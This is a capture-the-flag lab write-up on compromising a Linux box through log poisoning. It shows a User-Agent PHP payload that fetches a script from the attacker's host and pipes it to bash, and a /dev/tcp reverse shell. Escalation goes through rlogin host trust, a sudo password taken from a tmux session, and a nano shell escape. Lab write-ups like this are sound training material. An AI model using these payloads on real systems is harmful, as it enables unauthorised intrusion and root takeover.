---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Log-Poisoning
  - rlogin
  - Tmux
---
cx# Overview

| Name        | Retro     |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.234.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-28 06:58 CST
Nmap scan report for 10.129.234.130
Host is up (0.27s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6a:16:1f:c8:fe:fd:e3:98:a6:85:cf:fe:7b:0e:60:aa (ECDSA)
|_  256 e4:08:cc:5f:8e:56:25:8f:38:c3:ec:df:b8:86:0c:69 (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Admin Login
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration

![[reset.png]]

![[reset2.png]]

![[reset3.png]]

We can see password in reset. Login with those creds as admin in site.

![[reset4.png]]

I try to read the `/etc/passwd` file first but it look like there is some filter that only allowed me to specify file within the `/var/log` directory only. Since I know that this website is running with Apache so I try to view the content of the web log file at `/var/log/apache2/access.log` and to my surprise, I can really view this log and I noticed that there is not much content in this log file which I can now confirm that it should be a cleanup script to clear the log file. why? because I will abuse it to get a foothold soon!

```bash
┌─[us-dedivip-2]─[10.10.15.6]─[at0mxploit@htb-yrsqvfxny4]─[~]
└──╼ [★]$ curl 'http://reset.vl/dashboard.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \ 
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://reset.vl/dashboard.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://reset.vl' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: PHPSESSID=v1iskvs1sba48gnarichp6vdv1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'file=/var/log/apache2/access.log'

<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <title>Admin Dashboard</title>
</head>
<body>
<div class="container mt-5">
    <div class="panel panel-primary">
        <div class="panel-heading">
            <h3 class="panel-title text-center">Admin Dashboard</h3>
        </div>
        <div class="panel-body">
            <form method="POST">
                <div class="form-group">
                    <label for="file">Select Log File</label>
                    <select name="file" class="form-control" id="file" required>
                        <option value="/var/log/syslog">syslog</option>
                        <option value="/var/log/auth.log">auth.log</option>
                    </select>
                </div>
                <div class="form-group text-center">
                    <button type="submit" class="btn btn-primary btn-block">View Logs</button>
                </div>
            </form>
                            <div class="well">
                    <h4>Log Contents</h4>
                    <pre style="max-height: 400px; overflow-y: auto;">10.10.15.6 - - [28/Dec/2025:13:05:03 +0000] &quot;POST /dashboard.php HTTP/1.1&quot; 200 1169 &quot;http://reset.vl/dashboard.php&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0&quot;
</pre>
                </div>
                    </div>
        <div class="panel-footer text-center">
            Logged in as: <strong>admin</strong>
        </div>
    </div>
</div>
</body>
</html>
```
# Initial Foothold
## Log Poisoning + Command Injection

It is possible that the page is using some kind of OS call to fetch the file. I’ll try some simple command injection payloads, such as:

```
file=%2Fvar%2Flog%2fauth.log%3bid%3b
```

This is appending `;id;` to the end, so if the string were being passed to the OS for execution, it might inject the `id` command. I don’t see any results other than “Invalid file path”. I’ll try some other injections (like backticks, `&`, `|`, and `$()`), and try some other commands (like pinging my host), but none work.

Since I know that I can view `access.log` file which I can control it by sending whatever request to be logged and there is a possibility that this website is using `include()` to read the log file which mean Remote File Inclusion via Log Poisoning is a valid way to get a foothold on this box since when the server read the log then it will execute PHP script we could embeded in the `access.log` file or even use PHP `exec` to execute SYSTEM command on the box. There is couple of way to abuse this since there are 2 HTTP header that I can manipulate with php script which are “Referer” and “User-Agent”.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ curl -A "<?php system('curl 10.10.15.6:8000/rev.sh|bash'); ?>" http://reset.vl/
```

Then accessed the log via LFI like this:

```bash
curl 'http://reset.vl/dashboard.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://reset.vl' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://reset.vl/dashboard.php' \
  -H 'Cookie: PHPSESSID=t7o5oi93b249hifi44i8707so4' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'file=/var/log/apache2/access.log'
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.48.118 - - [29/Dec/2025 12:16:43] "GET /rev.sh HTTP/1.1" 200 -
10.129.48.118 - - [29/Dec/2025 12:16:44] "GET /rev.sh HTTP/1.1" 200 -
10.129.48.118 - - [29/Dec/2025 12:17:01] "GET /rev.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ cat rev.sh
bash  -c "bash -i >& /dev/tcp/10.10.15.6/4444   0>&1"
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.6] from (UNKNOWN) [10.129.48.118] 56374
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
www-data@reset:/var/www/html$ whoami
whoami
www-data
www-data@reset:/var/www/html$ cat /home/sadm/user.txt
cat /home/sadm/user.txt
19ba954c8ba8400cbfc0277f5f1669a4
```
# Privilege Escalation

While exploring, I noticed that **sadm** was listed as a trusted user. We can see that **rlogin** is set up through the `/etc/hosts.equiv` file, and that file is present on the box.

```bash
www-data@reset:/var/www/html$ cat /etc/hosts.equiv
cat /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#                   command access to your system .
- root
- local
+ sadm
www-data@reset:/var/www/html$
```
## Rlogin

Another interesting thing is that we can see the user **sadm** has an active **tmux** session.

```bash
www-data@reset:/var/www/html$ ps aux | grep sadm
ps aux | grep sadm
sadm        1212  0.0  0.2   8764  4120 ?        Ss   06:13   0:00 tmux new-session -d -s sadm_session
sadm        1215  0.0  0.2   8676  5488 pts/3    Ss+  06:13   0:00 -bash
www-data    1545  0.0  0.0   3472  1572 ?        S    06:34   0:00 grep sadm
```

To use **rlogin**, I saw that `sadm` was listed as a trusted user in `/etc/hosts.equiv`. So locally I created a user with the same name in our machine and then connect.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ sudo useradd sadm
[sudo] password for at0m:

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ sudo passwd sadm
New password:
Retype new password:
passwd: password updated successfully
```

```bash
sudo apt install rsh-redone-client
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ su sadm
Password:
$ rlogin reset.vl
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Dec 29 06:41:52 AM UTC 2025

  System load:           0.0
  Usage of /:            65.1% of 5.22GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             230
  Users logged in:       1
  IPv4 address for eth0: 10.129.48.118
  IPv6 address for eth0: dead:beef::250:56ff:feb0:6e2c

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul  9 13:32:23 UTC 2025 from 10.10.14.77 on pts/0
sadm@reset:~$ tmux ls
sadm_session: 1 windows (created Mon Dec 29 06:13:45 2025)
```
## Tmux

After checking what’s inside this session, I discover the usage of sudo to modify `/etc/firewall.sh` file with nano and the user even pipe the password in unsecure way. which MEAN I can use this password to spawn a shell as root in nano with sudo!

```bash
tmux a -t sadm_session
```

```bash
echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
sadm@reset:~$ echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
Too many errors from stdin
sadm@reset:~$
```

And.. we got sadm password!

 Password: `7lE2PAfVHfjz4HpE`

```bash
sadm@reset:~$ sudo -l
[sudo] password for sadm:
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !syslog

User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

Nano is very well-known linux lolbin that can be abused to spawn escalated shell via SUDO or SETUID according to [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) , so by executing nano with sudo then type Ctrl + R to switch to search mode and Ctrl + X to switch to execution mode then I can run bash shell from it as root.

```
sudo /usr/bin/nano /etc/firewall.sh
```

```
# Inside nano:
Ctrl + R
Ctrl + X

reset; sh 1>&0 2>&0
```

```bash
# ls
user.txt
# cat /root/root.txt
cat: /root/root.txt: No such file or directory
# ls /root
root_279e22f8.txt  snap
```

---